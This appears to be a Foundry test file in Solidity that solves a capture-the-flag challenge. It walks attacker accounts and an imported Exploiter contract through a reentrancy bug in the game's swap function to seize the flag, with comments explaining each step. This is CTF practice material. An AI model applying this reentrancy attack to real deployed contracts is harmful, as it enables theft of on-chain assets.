// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import {Utilities} from "./Utilities.sol";

import "src/Game.sol";
import "src/Exploiter.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


contract TestGame is Test {
    Game game;
    Utilities utils;

    address deployer;
    address attacker;
    address attacker2;
    address attacker3;
    

    function setUp() public {
        utils = new Utilities();

        deployer = utils.getNextUserAddress();
        vm.deal(deployer, 1 ether);
        vm.label(deployer, "Deployer");

        attacker = utils.getNextUserAddress();
        vm.deal(attacker, 1 ether);
        vm.label(attacker, "Attacker");

        attacker2 = utils.getNextUserAddress();
        vm.deal(attacker2, 1 ether);
        vm.label(attacker2, "Attacker2");

        attacker3 = utils.getNextUserAddress();
        vm.deal(attacker3, 1 ether);
        vm.label(attacker3, "Attacker3");

        // deplop the game, the deployer is the flag holder
        vm.prank(deployer);
        game = new Game();

        assertEq(deployer, game.flagHolder());
    }

     function testAttack() public {
        vm.prank(attacker);
        Exploiter exploiter = new Exploiter(game);
        vm.label(address(exploiter), "Exploiter");

        // The attacker has a second account that will use to join the game just to have Mon to swap with the main account
        vm.startPrank(attacker2);
        game.join();
        game.putUpForSale(3);
        game.putUpForSale(4);
        game.putUpForSale(5);
        vm.stopPrank();

        // The attacker has a third account that will use to join the game just to have Mon to swap with the main account
        vm.startPrank(attacker3);
        game.join();
        game.putUpForSale(6);
        game.putUpForSale(7);
        game.putUpForSale(8);
        vm.stopPrank();

        // The attacker contract join the game and put his mon up for sale
        vm.startPrank(attacker);
        exploiter.join();
        exploiter.putUpForSale(9);
        exploiter.putUpForSale(10);
        exploiter.putUpForSale(11);

        // The attacker's contract start to swap Mon with the secondary account leveraging the reentrancy issue
        exploiter.swap(address(attacker2), 9, 3);
        exploiter.swap(address(attacker2), 3, 4);
        exploiter.swap(address(attacker2), 4, 5);

        // The secondary account Mon are all dead now so we need to use the third account Mon
        // The attacker's contract start to swap Mon with the third account leveraging the reentrancy issue
        exploiter.swap(address(attacker3), 5, 6);

        // At this point we won the game because even if we didn't defeat the flag holder Mons
        // we have at the end of the fight more Mons compared to the flag holders
        // see the check `if (balanceOf(attacker) > balanceOf(opponent))`
        // so we get the flag!

        assertEq(address(exploiter), game.flagHolder());

    }
}
